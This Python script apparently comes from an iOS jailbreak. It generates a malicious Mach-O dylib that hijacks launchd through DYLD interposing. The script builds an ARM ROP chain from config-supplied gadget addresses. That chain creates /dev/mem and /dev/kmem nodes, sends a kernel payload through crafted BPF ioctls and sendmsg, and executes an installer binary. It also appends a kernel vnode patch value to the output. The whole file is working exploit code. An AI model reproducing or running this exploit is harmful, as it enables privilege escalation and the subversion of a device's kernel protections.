import struct, sys, os, json
import warnings
warnings.simplefilter('error')
debug_mode = False

config = json.loads(open('config.json').read())
arch = config['arch']
launchd = config['launchd']
assert arch in ['armv6', 'armv7']
imports = ['_open', '_ioctl', '_socket', '_sendmsg', '_mknod', '_chmod', '_close', '_execve', '_symlink', '_errno']
imports += ['_write', '_close']
def nexti(addr):
    if addr & 1:
        addr += 2
    else:
        addr += 4
    return addr
myreps = {
    '_getpid':                   launchd['-1'],
    '_unsetenv':                 launchd['0'],
    '_launch_data_new_errno':    launchd['1'],
    '_setrlimit':                launchd['2'],
    '__exit':                    launchd['3'],
    '_audit_token_to_au32':      launchd['4'],
    '_launch_data_unpack':       launchd['5'],
    '_launch_data_dict_iterate': launchd['6'],

    '_pthread_detach':           launchd['7']+4,
    '_strlcpy':                  launchd['7']+4,
}

imports = list(set(imports + myreps.keys()))
imports.sort()

beforesize = 0x8000
heapaddr = 0x11130000
baseaddr = heapaddr - beforesize

relocs = []
dontcare = 0

fwds = {}
def clear_fwd():
    global fwds
    for a in fwds.values():
        a.val = dontcare
    fwds = {}
def exhaust_fwd(*names):
    for name in names:
        if fwds.has_key(name):
            fwds[name].val = dontcare
            del fwds[name]
def set_fwd(name, val):
    assert fwds.has_key(name) and val is not None
    fwds[name].val = val
    del fwds[name]
class fwd:
    def __init__(self, name):
        assert not fwds.has_key(name)
        fwds[name] = self
        self.val = None
    def __trunc__(self):
        assert self.val is not None
        return int(self.val)
    def __repr__(self):
        return '<fwd: %s>' % self.val
class token:
    def __init__(self, heapstuff):
        self.sz1 = len(heapstuff)
        
    def done(self, heapstuff):
        self.sz2 = len(heapstuff)
        self.diff = (self.sz2 - self.sz1) * 4
    def __trunc__(self):
        assert self.diff is not None
        return self.diff
class plusser:
    def __init__(self, a, b):
        self.a = a
        self.b = b
    def __trunc__(self):
        return int(self.a) + int(self.b)
class car:
    def __trunc__(self):
        if not hasattr(self, '_val'):
            self._val = self.val()
        return self._val
    def __add__(self, other):
        return plusser(self, other)
class ptrI(car):
    def __init__(self, *args):
        self.args = args
    def val(self):
        global sheapaddr, sheap
        q = struct.pack('I'*len(self.args), *self.args)
        ret = sheapaddr + len(sheap)
        sheap += q
        while len(sheap) % 4 != 0: sheap += '\0'
        return ret
class ptr(car):
    def __init__(self, str, null_terminate=False):
        self.str = str
        self.null_terminate = null_terminate
    def val(self):
        global sheapaddr, sheap
        ret = sheapaddr + len(sheap)
        sheap += self.str
        if self.null_terminate: sheap += '\0'
        while len(sheap) % 4 != 0: sheap += '\0'
        return ret

class beef:
    def __init__(self, funcname):
        self.funcname = funcname
    def __trunc__(self):
        global heap, heapstuff, hidx
        relocs.append((heapaddr + len(heap) + 4*hidx, self.funcname))
        return 0

def ldr_r0_x(x):
    set_fwd('R4', x)
    set_fwd('PC', launchd['10'])
    exhaust_fwd('R5', 'R6', 'R7')
    return [fwd('R4'), fwd('R5'), fwd('R6'), fwd('R7'), fwd('PC')]

def mov_r0_x(x):
    set_fwd('R6', x)
    set_fwd('PC', launchd['11'])
    exhaust_fwd('R4', 'R5', 'R7')
    return [fwd('R4'), fwd('R5'), fwd('R6'), fwd('R7'), fwd('PC')]

def funcall(funcname, a1=dontcare, a2=dontcare, a3=dontcare, load=False):
    neg8 = launchd.has_key('-8')
    if load:
        ret = ldr_r0_x(a1)
        set_fwd('PC', nexti(launchd['-8' if neg8 else '8']))
        exhaust_fwd('R4')
    else:
        set_fwd('R4', a1)
        ret = []
        set_fwd('PC', launchd['-8' if neg8 else '8'])
    set_fwd('R6' if neg8 else 'R5', a2)
    set_fwd('R5' if neg8 else 'R6', a3)
    exhaust_fwd('R7')
    return ret + [dontcare, dontcare, dontcare, dontcare, beef(funcname), fwd('R4'), fwd('R5'), fwd('R6'), fwd('R7'), fwd('PC')]

def str_r0_x(s):
    set_fwd('R5', s)
    if launchd.has_key('-9'):
        set_fwd('PC', launchd['-9'])
        exhaust_fwd('R4', 'R7')
        return [fwd('R4'), fwd('R5'), fwd('R7'), fwd('PC')]
    else:
        set_fwd('PC', launchd['9'])
        exhaust_fwd('R4', 'R6', 'R7')
        return [fwd('R4'), fwd('R5'), fwd('R6'), fwd('R7'), fwd('PC')]


heap = ''

insns = open('insns.txt', 'rb').read()
s4 = ptrI(32)
s5 = ptrI(len(insns)/8, ptr(insns))
s_envp = ptrI(ptr('DYLD_INSERT_LIBRARIES=', True), 0)
s_install = ptr('/var/mobile/Media/spirit/install', True)
s_install_argp = ptrI(s_install, 0)
s_launchd = ptr('/sbin/launchd', True)
s_launchd_argp = ptrI(s_launchd, 0)
# 127.0.0.1:31337
s_addy =  ptr(struct.pack('>BBHIII', 0, 2, 31337, 0x7f000001, 0, 0))
hello = 'hi'
s_msg = ptr(hello)
s_iovec = ptrI(s_msg, len(hello), s_msg, len(hello))
s_msghdr = ptrI(s_addy, 16, s_iovec, 2, 0, 0, 0)
s_fd = ptr('\0\0\0\0')
s_fd2 = ptr('\0\0\0\0')

heapstuff = [fwd('R4'), fwd('R5'), fwd('R6'), fwd('R7'), fwd('PC')]

heapstuff += funcall('_mknod', ptr('/dev/mem', True),  020600, 0x3000000)
heapstuff += funcall('_mknod', ptr('/dev/kmem', True), 020600, 0x3000001)

heapstuff += funcall('_open', ptr('/dev/bpf0', True), 0)
heapstuff += str_r0_x(s_fd)
heapstuff += funcall('_ioctl', s_fd, 0xc0044266, s4, load=True)
heapstuff += funcall('_ioctl', s_fd, 0x8020426c, ptr('lo0', True), load=True)
heapstuff += funcall('_ioctl', s_fd, 0x80084267, s5, load=True)

heapstuff += funcall('_socket', 2, 2, 0)
heapstuff += str_r0_x(s_fd2)
heapstuff += funcall('_sendmsg', s_fd2, s_msghdr, 0, load=True)

heapstuff += funcall('_chmod', s_install, 0755)
heapstuff += funcall('_close', s_fd, load=True)
heapstuff += funcall('_execve', s_install, s_install_argp, s_envp)

# Okay that failed, so we are not installing and need to set up lo and stuff
# _socket should have succeeded though

# This part mimics launchctl.c

if debug_mode:
    def poop(name):
        s = '/dev/poop_%s__\0\0\0\0' % name
        sp = ptr(s, True)
        return str_r0_x(sp + s.find('\0')) + funcall('_symlink', sp, sp)
else:
    def poop(name):
        return []

s_ifreq = ptr('lo0' + '\0'*29)
heapstuff += funcall('_ioctl', s_fd2, 0xc0206911, s_ifreq, load=True)
heapstuff += poop('gif')
heapstuff += mov_r0_x(0x80490000)
heapstuff += str_r0_x(s_ifreq + 14)
heapstuff += funcall('_ioctl', s_fd2, 0x80206910, s_ifreq, load=True)
heapstuff += poop('sif')

s_ifra = 'lo0' + '\0'*13 + struct.pack('>BBHI', 16, 2, 0, 0x7f000001) + '\0'*24 + struct.pack('>BBHI', 16, 2, 0, 0xff000000) + '\0'*8
assert len(s_ifra) == 64
s_ifra = ptr(s_ifra)
heapstuff += funcall('_ioctl', s_fd2, 0x8040691a, s_ifra, load=True)
heapstuff += poop('ifraioctl')

heapstuff += funcall('_open', ptr('/dev/bpf0', True), 0)
heapstuff += str_r0_x(s_fd)
heapstuff += funcall('_ioctl', s_fd, 0xc0044266, s4, load=True)
heapstuff += poop('bpfioctl1')
heapstuff += funcall('_ioctl', s_fd, 0x8020426c, ptr('lo0', True), load=True)
heapstuff += poop('bpfioctl2')
heapstuff += funcall('_ioctl', s_fd, 0x80084267, s5, load=True)
heapstuff += poop('bpfioctl3')

heapstuff += funcall('_sendmsg', s_fd2, s_msghdr, 0, load=True)
heapstuff += poop('sendmsg')

if debug_mode:
    heapstuff += ldr_r0_x(beef('_errno'))
    heapstuff += poop('sendmsg_errno')

heapstuff += funcall('_close', s_fd, load=True)
heapstuff += funcall('_execve', s_launchd, s_launchd_argp, s_envp)
clear_fwd()

interpose = []
for k in myreps:
    interpose.append(ptr(k))
    interpose.append(ptr('_interpose' + k))

sheapaddr = heapaddr + 4*len(heapstuff)
sheap = ''

for hidx in xrange(len(heapstuff)):
    heapstuff[hidx] = int(heapstuff[hidx])

heap += struct.pack('I'*len(heapstuff), *heapstuff)
heap += sheap
assert len(heap) < 0x1654
heap += '\0' * (0x1654 - len(heap))
heap += struct.pack('IIII', dontcare, dontcare, heapaddr + 12, launchd['7'])

heapsize = len(heap)

for k, v in myreps.items():
    relocs.append((heapaddr + len(heap) + 4, k))
    heap += struct.pack('II', v, 0)

    

li = len(imports)
strings = '\0' + '\0'.join(sorted(imports)) + '\0'
fp = open(sys.argv[1], 'wb')
OFF = 0
def f(x):
    global OFF
    if isinstance(x, basestring):
        fp.write(x)
        OFF += len(x)
    else:
        fp.write(struct.pack('I', x))
        OFF += 4

lc_size = 0x7c + 0x50 + 0x18 # size of load commands

f(0xfeedface) # magic
if arch == 'armv6':
    f(12) # CPU_TYPE_ARM
    f(6) # CPU_SUBTYPE_ARM_V6
elif arch == 'armv7':
    f(12) # CPU_TYPE_ARM
    f(9) # CPU_SUBTYPE_ARM_V7
elif arch == 'i386':
    f(7)
    f(3)
f(6) # MH_DYLIB
f(6) # number of load commands
f(123) # overwrite this
f(0x00000104) # flags

# Load commands
# linkedit!
# LC_SEGMENT
f(1)
f(56)
f('__LINKEDIT' + '\0'*6)
f(baseaddr) # vmaddr
f(0x1000) # vmsize
f(0) # fileoff
f(0x1000) # filesize
f(3) # maxprot
f(3) # initprot
f(0) # no sections
f(0) # flags=0

# LC_SEGMENT
f(1) 
f(56 + 68)
f('__TEXT' + '\0'*10)
f(baseaddr+0x1000) # vmaddr
f(beforesize - 0x1000) # vmsize
f(0x1000) # fileoff
linky = OFF
f(0x1000) # filesize
f(3) # maxprot = VM_PROT_READ | VM_PROT_WRITE
f(3) # initprot = VM_PROT_READ | VM_PROT_WRITE
f(1) # 2 sections
f(0) # flags=0

# Section 1
f('__text' + '\0'*10)
f('__TEXT' + '\0'*10)
f(baseaddr+0x1000) # address
f(0x1000) # size
f(0x1000) # off
f(0) # align
f(0x1000) # reloff
f(len(relocs)) # nreloc
f(0) # flags
f(0) # reserved1
f(0) # reserved2

# LC_SEGMENT
f(1) 
f(56 + 2*68)
f('__DATA' + '\0'*10)
f(heapaddr) # vmaddr
f(0x2000) # vmsize
f(0x2000) # fileoff
linky2 = OFF
f(0x2000) # filesize
f(3) # maxprot = VM_PROT_READ | VM_PROT_WRITE
f(3) # initprot = VM_PROT_READ | VM_PROT_WRITE
f(2) # 2 sections
f(0) # flags=0

# Section 1
f('__heap' + '\0'*10)
f('__DATA' + '\0'*10)
f(heapaddr) # address
split1 = OFF
f(0xbeef) # size
f(0x2000) # off
f(0) # align
f(0) # reloff
f(0) # nreloc
f(0) # flags
f(0) # reserved1
f(0) # reserved2

# Section 2
f('__interpose' + '\0'*5)
f('__DATA' + '\0'*10)
split2 = OFF
f(0xbeef) # address
f(0xbeef) # size
f(0xbeef) # off
f(0) # align
f(0) # reloff
f(0) # nreloc
f(0) # flags
f(0) # reserved1
f(0) # reserved2

f(0xc) # LC_LOAD_DYLIB
path = 'libSystem.dylib'
while len(path) % 4 != 0: path += '\x00'
f(6*4 + len(path))
f(24)
f(0) # timestamp
f(0) # version
f(0) # version
f(path)

f(2) # LC_SYMTAB
f(4*6)
f(0x1000 + 8*len(relocs)) # symbol table offset
f(li) # nsyms
stringy = OFF
f(0) # stroff
f(len(strings)) # strsize

# dyld crashes without this
f(0xb) # LC_DYSYMTAB
f(0x50)
f(0); f(0) # local
f(li); f(0) # extdef
f(0); f(0) # undef
f(0); f(0) # toc
f(0); f(0) # modtab
f(0); f(0) # extrefsym
f(0); f(0) # indirectsym
f(0x1000); f(len(relocs)) # extrel
f(0); f(0) # locrel

fp.seek(0x14)
fp.write(struct.pack('I', OFF - 0x1c))
fp.seek(OFF)



fp.seek(0x1000) # __TEXT
OFF = 0x1000

# Relocations
for addr, new in relocs:
    f(addr - baseaddr)
    f(0x0c000000 | imports.index(new))
    

# Symbol table - undefined
for imp in imports:
    f(strings.find('\0'+imp+'\0') + 1)
    f('\x01')
    f('\x00') 
    f('\x20\x00') # N_GSYM
    f(0) # n_value


fp.seek(stringy)
fp.write(struct.pack('I', OFF))
fp.seek(OFF)
f(strings)


fp.seek(0x2000)
OFF = 0x2000
fp.write(heap)

assert fp.tell() < 0x4000
OFF = fp.tell()

# Tack this on at the end for the installer to find
# (lame but whatever)
fp.write(struct.pack('I', config['kern']['vnode_patch']))

fp.seek(split1)
fp.write(struct.pack('I', heapsize))
fp.seek(split2)
fp.write(struct.pack('III', heapaddr + heapsize, 8*len(myreps), 0x2000 + heapsize))
fp.seek(linky)
fp.write(struct.pack('I', OFF - 0x1000))
fp.seek(linky2)
fp.write(struct.pack('I', OFF - 0x2000))

